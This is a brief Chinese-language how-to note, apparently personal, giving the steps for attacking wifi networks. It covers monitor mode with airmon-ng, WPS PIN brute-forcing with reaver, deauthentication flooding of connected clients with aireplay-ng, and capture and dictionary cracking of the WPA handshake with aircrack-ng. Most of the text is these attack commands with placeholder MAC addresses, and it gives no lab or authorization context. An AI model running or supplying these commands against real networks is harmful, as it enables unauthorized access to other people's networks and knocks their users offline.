### wifi

****

wifi攻击的几个步骤:

首先将无线网卡进行设置,成监听模式:

sudo airmon-ng start xxxxxxxxxxxxxx

之后进行监听

sudo airodump-ng mon0

之后获取到目标

目标一般有几个状态

**第一个是PIN码开放可以攻击**

reaver -i mon0 -b AP's Mac -vv 进行PIN码的暴力破解

获得到pin后进行破解:

reaver -i mon0 -b AP‘s Mac -p pin

![img](http://d.hiphotos.bdimg.com/album/pic/item/d6ca7bcb0a46f21fbdce556af5246b600c33ae14.jpg)

之后就可以.....

**第二种就是WPS功能没开,只能抓握手包进行暴力破解了**

先抓包 

airodump -ng -c 6 -w ~/git/handshake --bssid xxxxxxxxxxx mon0

之后进行洪水攻击

aireplay-ng -0 10 -a AP的mac地址 -c 你要踢掉的主机的mac地址 mon0

之后得到了握手包进行字典破解

aircrack-ng -a2 -b xxxxxxxxxxxx -w passwd.txt 握手包